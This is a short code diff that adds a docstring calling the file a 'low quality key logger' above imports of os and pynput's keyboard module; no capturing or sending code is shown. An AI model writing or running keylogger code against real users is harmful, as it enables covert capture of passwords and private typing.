@@ -1,3 +1,7 @@
+"""
+low quality key logger
+"""
+
 import os
 from pynput import keyboard
 
